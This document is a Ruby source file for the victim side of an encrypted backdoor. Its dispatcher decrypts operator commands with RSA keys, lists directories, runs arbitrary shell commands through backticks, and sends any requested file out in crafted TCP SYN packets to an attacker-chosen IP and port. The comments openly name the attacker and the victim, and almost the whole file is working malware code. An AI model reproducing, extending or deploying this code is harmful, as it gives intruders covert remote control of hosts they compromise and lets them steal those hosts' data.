#!/usr/bin/env ruby

require "openssl"
require "socket"
require "packetfu"

include PacketFu

# -------------------------------------------------------------
# Dispatch
#
# Respond to an incomming command.
# -------------------------------------------------------------

class Dispatch

	@response = ""
	@interface = ""
	@ethaddr = ""

	def initialize(ciphertext, interface, ethaddr)
		plaintext = decrypt ciphertext
        @interface = interface
        @ethaddr = ethaddr

		# Split up the request so we can pass the parameters to the correct method
		request = plaintext.split

		case request[0].downcase
		when "ls"
			ls request[1]
		when "get"
			get request[1], request[2], request[3]
		when "die"
			die
		when "cmd"
			cmd request[1]
			"Unknown command."
		end
	end

# -------------------------------------------------------------
# Commands
# -------------------------------------------------------------

	# LS
	#
	# List the contents of the current directory, or a given 
	# directory path.
	
	def ls(path = "")
		cmd 'ls ' + path
	end

	# Get
	# 
	# Send a file back to the attacker on a specified port

	def get(path, ip, port)
		# Make sure the file exists
		if ! File.file? path
			return "Sorry, that file does not exist."
		else
			cfg = Utils.whoami?(:iface => @interface)

			File.open(path, "rb") do |file|
				while(line = file.gets)
				    tcp = TCPPacket.new(:config => cfg)
					tcp.eth_saddr = cfg[:eth_saddr]
					tcp.eth_daddr = @ethaddr
					
					tcp.tcp_src = rand(0xfff - 1024) + 1024
					tcp.tcp_dst = Integer(port)
					tcp.tcp_flags.syn = 1
					
					tcp.ip_saddr = cfg[:ip_saddr]
					tcp.ip_daddr = ip
					
					tcp.payload = encrypt line
					tcp.recalc
					
					tcp.to_w(@interface)
				end
			end
			
			tcp = TCPPacket.new
			tcp.eth_saddr = cfg[:eth_saddr]
			tcp.eth_daddr = @ethaddr
					
			tcp.tcp_src = rand(0xfff - 1024) + 1024
			tcp.tcp_dst = Integer(port)
			tcp.tcp_flags.fin = 1
			
			tcp.ip_saddr = cfg[:ip_saddr]
			tcp.ip_daddr = ip
			
			tcp.recalc
			tcp.to_w(@interface)
			
			@response = "Sending Complete"

			# Begin passing file to client

		end
	end

	# Die
	#
	# Shut the program down.

	def die()
		#TODO any necessary clean up?
		exit
	end

	# Cmd
	#
	# Run any command and send the result to the attacker.

	def cmd(command)
		@response = `#{command}`
	end

	# to_string
	#
	# Returns the response of the command
	def to_string()
		return encrypt @response
	end

# -------------------------------------------------------------
# Encryption
#
# Asymmetric ncryption scheme for the victim host. Encrypt
# using the attackers public key, decrypt using its own 
# private key.
# -------------------------------------------------------------

	# Encrypt
	#
	# Encrypt a string using the attacker's public key and return
	# the cipher text.

	def encrypt(data)
		key = OpenSSL::PKey::RSA.new File.read '../keys/attacker.pub'
		return key.public_key.public_encrypt(data)
	end

	# Dcrypt
	#
	# Decrypt cipher text using the vicitim's private key and
	# return the result. 

	def decrypt(data)
		key = OpenSSL::PKey::RSA.new File.read '../keys/victim.pem'
		return key.private_decrypt(data)
	end

# -------------------------------------------------------------
# Fin
# -------------------------------------------------------------

end
